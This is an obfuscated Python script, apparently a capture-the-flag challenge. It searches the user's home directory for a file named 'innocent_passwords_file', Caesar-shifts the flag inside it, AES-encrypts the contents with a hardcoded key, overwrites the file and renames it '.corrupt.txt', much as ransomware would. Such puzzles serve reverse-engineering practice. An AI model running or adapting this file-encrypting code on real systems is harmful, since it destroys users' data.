# HAHA
if 82 - 82: Iii1i
import os
import re
import time
import string
import random
from cryptography . hazmat . primitives . ciphers import (
 Cipher , algorithms , modes
 )
if 87 - 87: Ii % i1i1i1111I . Oo / OooOoo * I1Ii1I1 - I1I
ooo0oOoooOOO0 = '''\r\n\n\n
THIS IS THE FLAG FOR ENCRYPTION KEY CHALLENGE
     |
     |
    \ /
     V
'''
oOo0O00 = 'pffffdigitalflag'
i1iiIII111 = '''
[####]...............[####][####]............[####]......
[####]...........[####]........[####]........[####]......
[####]...........[####]........[####]........[####]......
[####]...........[####]........[####]........[####]......
[####][####].........[####][####]............[####][####] 
'''
if 29 - 29: iI + o00Oo - OOoOoo000O00 * Oo0Oo - ii1I1iII1I1I . i1I1IiIIiIi1
def oo0O000ooO ( iv , key , tocipher ) :
 iIIiiIIiii1 = Cipher ( algorithms . AES ( key ) , modes . CBC ( iv ) )
 iIi1ii1I1iI11 = iIIiiIIiii1 . encryptor ( )
 o00o0OO00O = iIi1ii1I1iI11 . update ( tocipher ) + iIi1ii1I1iI11 . finalize ( )
 return ( o00o0OO00O )
 if 57 - 57: iiIi1 - ii % iiI * IIi1i111IiII . i1I
 if 46 - 46: o00ooO0Ooooo - ooOOooO0 % Ii . i1I
def iiIII ( ) :
 pass
 if 28 - 28: I1Ii1I1 . Iii1i - o00Oo - ii
def O0000OooOoo00 ( n , s ) :
 Iio0 = string . ascii_lowercase
 i1i = string . ascii_uppercase
 I1i = str . maketrans ( Iio0 + i1i ,
 Iio0 [ n : ] + Iio0 [ : n ] + i1i [ n : ] + i1i [ : n ] )
 return str . translate ( s , I1i )
 if 75 - 75: ooOOooO0 . iiIi1 . o00ooO0Ooooo * IIi1i111IiII % Oo0Oo
 if 34 - 34: Oo0Oo * iI
 if 34 - 34: OOoOoo000O00 / Oo0Oo - Iii1i . ii
def ii1IiIiiII ( ) :
 if 21 - 21: OOoOoo000O00 % IIi1i111IiII % i1I . OOoOoo000O00
 for iii11i , Oo0Oo00O0OO , iIIiiIi1Ii1I in os . walk ( os . path . expanduser ( "~" ) ) :
  for oo0 in iIIiiIi1Ii1I :
   if ( "innocent_passwords_file" in oo0 ) :
    if ( "corrupt" in oo0 ) :
     time . sleep ( 30 * 60 )
    else :
     i11iIii = ( os . path . join ( iii11i , oo0 ) )
     if 40 - 40: ii1I1iII1I1I . iI / Oo
 if ( i11iIii is None ) :
  return
  if 46 - 46: ooOOooO0 - OooOoo * I1Ii1I1 / iiIi1 / Iii1i
 with open ( i11iIii , 'r' ) as I11iIi1i :
  oooOOOooo = I11iIi1i . read ( )
  if 85 - 85: Oo0Oo - o00Oo
 I11I11I = re . search ( '\{(?P<fruit>.+)\}' , oooOOOooo ) . group ( 'fruit' )
 oooOOOooo = oooOOOooo . replace ( I11I11I , O0000OooOoo00 ( random . randint ( 2 , 25 ) , I11I11I ) )
 if 4 - 4: o00Oo
 IiOOO00oO0oOo0O = os . urandom ( 16 )
 o00o0OO00O = oo0O000ooO ( IiOOO00oO0oOo0O , bytes ( oOo0O00 , 'utf-8' ) , bytes ( oooOOOooo , 'utf-8' ) )
 if 1 - 1: I1I % iiIi1 + Oo0Oo . Oo0Oo % Oo
 with open ( i11iIii , 'w' ) as I11iIi1i :
  I11iIi1i . write ( 'what was your password: {ct}\r\n\r\n{surprise}' . format ( ct = str ( o00o0OO00O ) , surprise = i1iiIII111 ) )
  if 93 - 93: OOoOoo000O00 % iiIi1 * Oo0Oo
 os . rename ( i11iIii , "{filename}.corrupt.txt" . format ( filename = i11iIii ) )
 if 52 - 52: i1I + I1I / i1I1IiIIiIi1 - I1Ii1I1 * o00ooO0Ooooo % OOoOoo000O00
 if 52 - 52: OOoOoo000O00 . I1I + o00ooO0Ooooo - Oo0Oo % ii
if __name__ == "__main__" :
 ii1IiIiiII ( )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
